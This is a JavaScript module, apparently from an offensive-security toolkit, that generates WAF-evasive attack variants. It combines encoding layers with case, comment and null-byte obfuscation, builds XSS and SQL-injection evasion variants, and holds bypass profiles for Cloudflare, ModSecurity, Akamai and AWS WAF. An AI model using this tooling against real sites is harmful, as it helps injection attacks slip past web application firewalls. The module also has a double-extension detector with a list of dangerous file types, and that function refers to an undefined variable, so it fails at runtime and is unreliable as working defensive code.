/**
 * Payload Generator - WAF-evasive payload generation with encoding utilities
 * Phase 117: Payload Development
 * 
 * MITRE ATT&CK:
 * - T1027.010: Obfuscated Payloads - Command obfuscation techniques
 * - T1036.007: Double File Extension - File masquerading detection
 */

"use strict";

// ============================================================================
// ENCODING UTILITIES (PAYLOAD-03)
// ============================================================================

/**
 * Standard Base64 encoding
 * @param {string} str - Input string
 * @returns {string} Base64 encoded string
 */
function base64Encode(str) {
  return Buffer.from(str, "utf8").toString("base64");
}

/**
 * Base64 decoding
 * @param {string} str - Base64 encoded string
 * @returns {string} Decoded string
 */
function base64Decode(str) {
  return Buffer.from(str, "base64").toString("utf8");
}

/**
 * URL percent encoding
 * @param {string} str - Input string
 * @returns {string} Percent-encoded string
 */
function urlEncode(str) {
  return encodeURIComponent(str);
}

/**
 * URL percent decoding
 * @param {string} str - Percent-encoded string
 * @returns {string} Decoded string
 */
function urlDecode(str) {
  return decodeURIComponent(str);
}

/**
 * Hexadecimal encoding
 * @param {string} str - Input string
 * @returns {string} Hex-encoded string
 */
function hexEncode(str) {
  return str
    .split("")
    .map((c) => c.charCodeAt(0).toString(16).padStart(2, "0"))
    .join("");
}

/**
 * Hexadecimal decoding
 * @param {string} str - Hex-encoded string
 * @returns {string} Decoded string
 */
function hexDecode(str) {
  const hex = str.match(/.{1,2}/g) || [];
  return hex.map((h) => String.fromCharCode(parseInt(h, 16))).join("");
}

/**
 * HTML entity encoding
 * @param {string} str - Input string
 * @returns {string} HTML entity encoded string
 */
function htmlEncode(str) {
  const entities = {
    "&": "&amp;",
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#x27;",
    "/": "&#x2F;",
  };
  return str.replace(/[&<>"'/]/g, (char) => entities[char] || char);
}

/**
 * HTML entity decoding
 * @param {string} str - HTML entity encoded string
 * @returns {string} Decoded string
 */
function htmlDecode(str) {
  const entities = {
    "&amp;": "&",
    "&lt;": "<",
    "&gt;": ">",
    "&quot;": '"',
    "&#x27;": "'",
    "&#x2F;": "/",
    "&#39;": "'",
    "&#x3D;": "=",
    "&#96;": "`",
  };
  return str.replace(
    /&(?:amp|lt|gt|quot|#x27|#x2F|#39|#x3D|#96);/g,
    (entity) => entities[entity] || entity
  );
}

/**
 * Unicode escape sequence encoding (T1027.010)
 * @param {string} str - Input string
 * @returns {string} Unicode escaped string
 */
function unicodeEncode(str) {
  return str
    .split("")
    .map((c) => "\\u" + c.charCodeAt(0).toString(16).padStart(4, "0"))
    .join("");
}

/**
 * Unicode normalization forms
 * @param {string} str - Input string
 * @returns {string} Unicode normalized string (NFKC)
 */
function unicodeNormalize(str) {
  return str.normalize("NFKC");
}

// ============================================================================
// COMMAND OBFUSCATION (PAYLOAD-02, T1027.010)
// ============================================================================

/**
 * Mixed case obfuscation (T1027.010)
 * Randomly changes character case to evade signature detection
 * @param {string} str - Input string
 * @returns {string} Mixed case variant
 */
function caseObfuscate(str) {
  return str
    .split("")
    .map((c) => {
      if (c.match(/[a-zA-Z]/)) {
        return Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase();
      }
      return c;
    })
    .join("");
}

/**
 * Comment injection to break payload signatures (T1027.010)
 * Injects inline comments between characters
 * @param {string} payload - Input payload
 * @returns {string} Payload with injected comments
 */
function commentInject(payload) {
  // Inject comment between each character
  const comment = "/**/";
  return payload.split("").join(comment);
}

/**
 * Reverse command string
 * @param {string} cmd - Command string
 * @returns {string} Reversed command
 */
function reverseCommand(cmd) {
  return cmd.split("").reverse().join("");
}

/**
 * Null byte injection (T1027.010)
 * Prepends null bytes to bypass extension checks
 * @param {string} cmd - Command string
 * @returns {string} Command with null byte prefix
 */
function nullByteInject(cmd) {
  return "\0" + cmd;
}

// ============================================================================
// MULTI-LAYER ENCODING (PAYLOAD-03)
// ============================================================================

/**
 * Apply multiple encoding layers in sequence
 * @param {string} payload - Input payload
 * @param {string[]} layers - Array of encoding types ('base64', 'url', 'hex', 'html', 'unicode')
 * @returns {string} Multi-layer encoded payload
 */
function multiLayerEncode(payload, layers) {
  let result = payload;
  for (const layer of layers) {
    switch (layer.toLowerCase()) {
      case "base64":
        result = base64Encode(result);
        break;
      case "url":
        result = urlEncode(result);
        break;
      case "hex":
        result = hexEncode(result);
        break;
      case "html":
        result = htmlEncode(result);
        break;
      case "unicode":
        result = unicodeEncode(result);
        break;
      default:
        throw new Error(`Unknown encoding layer: ${layer}`);
    }
  }
  return result;
}

/**
 * Generate all encoded variants for a payload
 * @param {string} payload - Base payload
 * @param {string} attackType - Attack type ('xss', 'sqli', 'command')
 * @returns {string[]} Array of encoded variants
 */
function generateEncodedVariants(payload, attackType) {
  const variants = [];

  // Single encodings
  variants.push(base64Encode(payload));
  variants.push(urlEncode(payload));
  variants.push(hexEncode(payload));
  variants.push(htmlEncode(payload));
  variants.push(unicodeEncode(payload));

  // Double encodings
  variants.push(base64Encode(urlEncode(payload)));
  variants.push(urlEncode(base64Encode(payload)));
  variants.push(hexEncode(base64Encode(payload)));
  variants.push(htmlEncode(base64Encode(payload)));
  variants.push(unicodeEncode(base64Encode(payload)));

  // Add attack-type specific variants
  if (attackType === "xss") {
    variants.push(...generateXssVariants(payload));
  } else if (attackType === "sqli") {
    variants.push(...generateSqliVariants(payload));
  } else if (attackType === "command") {
    variants.push(caseObfuscate(payload));
    variants.push(commentInject(payload));
    variants.push(reverseCommand(payload));
    variants.push(nullByteInject(payload));
  }

  // Remove duplicates
  return [...new Set(variants)];
}

// ============================================================================
// XSS/SQLi EVASION (PAYLOAD-04)
// ============================================================================

/**
 * Generate XSS evasion variants
 * @param {string} payload - XSS payload
 * @returns {string[]} Array of XSS variants
 */
function generateXssVariants(payload) {
  const variants = [];

  // Case variation
  variants.push(caseObfuscate(payload));

  // Comment injection
  variants.push(commentInject(payload));

  // Unicode encoding
  variants.push(unicodeEncode(payload));

  // HTML + Unicode combination
  variants.push(unicodeEncode(htmlEncode(payload)));

  // Mixed variations
  const words = payload.split(/<\/?script>/i);
  if (words.length > 1) {
    // Break up <script> tags
    variants.push(
      "<sc" + "ript>" + words[1] + "</sc" + "ript>"
    );
    variants.push(
      "<script" +
        commentInject(">") +
        ">" +
        words[1] +
        "</script>"
    );
  }

  // Null byte variants
  if (payload.includes("<script>")) {
    variants.push(
      payload.replace("<script>", "\0<script>")
    );
  }

  return variants;
}

/**
 * Generate SQLi evasion variants
 * @param {string} payload - SQLi payload
 * @returns {string[]} Array of SQLi variants
 */
function generateSqliVariants(payload) {
  const variants = [];

  // Comment injection (inline SQL comments)
  variants.push(
    payload
      .replace(/(\s)/g, "/**/")
  );

  // Null byte injection
  variants.push(nullByteInject(payload));

  // Case obfuscation
  variants.push(caseObfuscate(payload));

  // URL encoding
  variants.push(urlEncode(payload));

  // Double URL encoding
  variants.push(urlEncode(urlEncode(payload)));

  // Hex encoding for string literals
  if (payload.includes("'")) {
    variants.push(payload.replace(/'/g, "0x27"));
  }

  // Comment between keywords
  variants.push(
    payload
      .replace(/\s+(OR|AND|UNION|SELECT)\s+/gi, " $1/**/ ")
  );

  return variants;
}

// ============================================================================
// DOUBLE EXTENSION DETECTION (PAYLOAD-05, T1036.007)
// ============================================================================

/**
 * Dangerous file extensions that could execute code
 */
const DANGEROUS_EXTENSIONS = [
  ".php",
  ".php3",
  ".php4",
  ".php5",
  ".phtml",
  ".asp",
  ".aspx",
  ".jsp",
  ".jspx",
  ".cgi",
  ".exe",
  ".bat",
  ".cmd",
  ".sh",
  ".py",
  ".rb",
  ".pl",
  ".jar",
  ".war",
  ".svg",
];

/**
 * Benign-looking extensions often used in masquerading
 */
const BENIGN_EXTENSIONS = [
  ".jpg",
  ".jpeg",
  ".png",
  ".gif",
  ".pdf",
  ".txt",
  ".csv",
  ".doc",
  ".docx",
  ".xls",
  ".xlsx",
  ".mp3",
  ".mp4",
  ".avi",
];

/**
 * Detect double file extension masquerading (T1036.007)
 * @param {string} filename - Filename to analyze
 * @returns {{isSuspicious: boolean, description: string}} Detection result
 */
function detectDoubleExtension(filename) {
  const lower = filename.toLowerCase();

  // Find all extension-like patterns
  const extPattern = /\.([a-z0-9]+)/gi;
  const matches = [];
  let match;
  while ((match = extPattern.exec(lower)) !== null) {
    matches.push("." + match[1]);
  }

  // Need at least 2 extensions for double extension
  if (matches.length < 2) {
    return {
      isSuspicious: false,
      description: "No double extension pattern detected",
    };
  }

  // Check for dangerous extension paired with benign one
  const lastExt = matches[matches.length - 1];
  const secondLastExt = matches[matches.length - 2];

  const isLastBenign = BENIGN_EXTENSIONS.includes(lastExt);
  const isSecondLastDangerous = DANGEROUS_EXTENSIONS.includes(secondLastExt);

  if (isSecondLastDangerous && isLastBenign) {
    return {
      isSuspicious: true,
      description: `Double extension detected: ${secondLastExt}${lastExt} - likely file masquerading (T1036.007). File may execute code when opened.`,
      detectedExtensions: matches,
      dangerousExtension: secondLastExt,
      benignExtension: lastExt,
    };
  }

  // Also flag if last extension is dangerous (regardless of second-to-last)
  if (isLastDangerous) {
    return {
      isSuspicious: true,
      description: `Dangerous extension '${lastExt}' detected in filename`,
      detectedExtensions: matches,
      dangerousExtension: lastExt,
    };
  }

  return {
    isSuspicious: false,
    description: "No suspicious double extension pattern detected",
    detectedExtensions: matches,
  };
}

// ============================================================================
// WAF PROFILES (PAYLOAD-01)
// ============================================================================

/**
 * Pre-configured WAF bypass profiles
 */
const WAF_PROFILES = {
  cloudflare: {
    name: "Cloudflare WAF",
    bypassPatterns: [
      "Case variation: /cGi/ for /cgi/",
      "Comment injection: /c/**/gi/",
      "Double encoding: %25 for %",
      "Null byte injection",
    ],
  },
  modsecurity: {
    name: "ModSecurity WAF",
    bypassPatterns: [
      "UTF-8 encoding",
      "Unicode normalization",
      "Case variation",
      "Comment injection between keywords",
    ],
  },
  akamai: {
    name: "Akamai WAF",
    bypassPatterns: [
      "Case obfuscation",
      "Null byte prefix",
      "Multi-layer encoding",
      "Mixed encoding types",
    ],
  },
  aws_waf: {
    name: "AWS WAF",
    bypassPatterns: [
      "Hex encoding",
      "URL encoding variations",
      "Case variation",
      "Comment injection",
    ],
  },
};

// ============================================================================
// PAYLOAD GENERATOR CLASS
// ============================================================================

/**
 * PayloadGenerator - Main class for generating WAF-evasive payloads
 */
class PayloadGenerator {
  /**
   * @param {Object} options - Configuration options
   * @param {Object} options.cache - Optional cache for token optimization
   */
  constructor(options = {}) {
    this.cache = options.cache || null;
    this.wafProfiles = WAF_PROFILES;
  }

  /**
   * Generate encoded variants of a payload
   * @param {string} payload - Base payload
   * @param {string} attackType - Attack type ('xss', 'sqli', 'command')
   * @returns {string[]} Array of encoded variants
   */
  generateEncodedVariants(payload, attackType) {
    return generateEncodedVariants(payload, attackType);
  }

  /**
   * Generate multi-layer encoded payload
   * @param {string} payload - Input payload
   * @param {string[]} layers - Encoding layers to apply
   * @returns {string} Encoded payload
   */
  multiLayerEncode(payload, layers) {
    return multiLayerEncode(payload, layers);
  }

  /**
   * Generate WAF-evasive variants
   * @param {string} payload - Base payload
   * @param {string} wafProfile - WAF profile name
   * @returns {string[]} Array of WAF-evasive variants
   */
  generateWafEvasion(payload, wafProfile) {
    const profile = this.wafProfiles[wafProfile.toLowerCase()];
    if (!profile) {
      return generateEncodedVariants(payload, "command");
    }

    const variants = [];

    // Apply techniques based on profile
    switch (wafProfile.toLowerCase()) {
      case "cloudflare":
        variants.push(caseObfuscate(payload));
        variants.push(commentInject(payload));
        variants.push(
          urlEncode(urlEncode(payload))
        );
        variants.push(nullByteInject(payload));
        break;
      case "modsecurity":
        variants.push(unicodeNormalize(payload));
        variants.push(unicodeEncode(payload));
        variants.push(caseObfuscate(payload));
        variants.push(payload.replace(/\s+/g, "/**/"));
        break;
      case "akamai":
        variants.push(caseObfuscate(payload));
        variants.push(nullByteInject(payload));
        variants.push(multiLayerEncode(payload, ["base64", "url"]));
        variants.push(commentInject(payload));
        break;
      case "aws_waf":
        variants.push(hexEncode(payload));
        variants.push(urlEncode(payload));
        variants.push(caseObfuscate(payload));
        variants.push(multiLayerEncode(payload, ["base64", "hex"]));
        break;
      default:
        variants.push(...generateEncodedVariants(payload, "command"));
    }

    return [...new Set(variants)];
  }

  /**
   * Detect double file extension masquerading
   * @param {string} filename - Filename to analyze
   * @returns {{isSuspicious: boolean, description: string}} Detection result
   */
  detectDoubleExtension(filename) {
    return detectDoubleExtension(filename);
  }
}

// ============================================================================
// EXPORTS
// ============================================================================

module.exports = {
  // Classes
  PayloadGenerator,

  // Encoding utilities
  base64Encode,
  base64Decode,
  urlEncode,
  urlDecode,
  hexEncode,
  hexDecode,
  htmlEncode,
  htmlDecode,
  unicodeEncode,
  unicodeNormalize,

  // Command obfuscation
  caseObfuscate,
  commentInject,
  reverseCommand,
  nullByteInject,

  // Multi-layer encoding
  multiLayerEncode,
  generateEncodedVariants,

  // Evasion generators
  generateXssVariants,
  generateSqliVariants,

  // Detection
  detectDoubleExtension,

  // WAF profiles
  WAF_PROFILES,
};
